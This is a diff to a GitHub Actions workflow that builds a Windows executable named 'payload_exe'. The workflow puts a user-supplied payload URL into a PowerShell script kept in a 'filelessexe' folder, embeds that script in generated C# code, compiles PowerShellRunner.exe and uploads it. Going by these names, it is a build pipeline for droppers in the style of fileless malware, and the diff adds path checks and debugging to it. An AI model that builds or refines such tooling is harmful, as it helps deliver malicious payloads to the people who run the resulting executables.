@@ -19,11 +19,22 @@ jobs:
       - name: Install .NET SDK
         run: dotnet --version
 
+      - name: Debug - List files
+        shell: powershell
+        run: Get-ChildItem -Path ${{ github.workspace }} -Recurse
+
       - name: Inject URL into static_code.ps1
         shell: powershell
         run: |
+          $scriptPath = "${{ github.workspace }}\filelessexe\static_code.ps1"
+          
+          if (-Not (Test-Path $scriptPath)) {
+              Write-Host "[ERROR] static_code.ps1 not found at $scriptPath"
+              exit 1
+          }
+
           $url = "${{ github.event.inputs.payload_url }}"
-          (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
+          (Get-Content $scriptPath) -replace '__PAYLOAD_URL__', $url | Set-Content $scriptPath
 
       - name: Create .NET console project
         shell: powershell
@@ -35,9 +46,16 @@ jobs:
       - name: Generate C# code with Embedded PowerShell Script
         shell: powershell
         run: |
-          Write-Host "[INFO] Reading PowerShell script..."
-          $ps_script = Get-Content -Path '../static_code.ps1' -Raw
+          $scriptPath = "${{ github.workspace }}\filelessexe\static_code.ps1"
           
+          if (-Not (Test-Path $scriptPath)) {
+              Write-Host "[ERROR] static_code.ps1 not found at $scriptPath"
+              exit 1
+          }
+
+          Write-Host "[INFO] Reading PowerShell script..."
+          $ps_script = Get-Content -Path $scriptPath -Raw
+
           Write-Host "[INFO] Escaping PowerShell script..."
           $escaped_script = $ps_script -replace "\\", "\\\\" -replace "`"", "\\`"" -replace "`r?`n", "\n"
 
@@ -89,7 +107,8 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: payload_exe
-          path: PowerShellRunner/bin/Release/**/*.exe
+          path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe
+
 
 
 
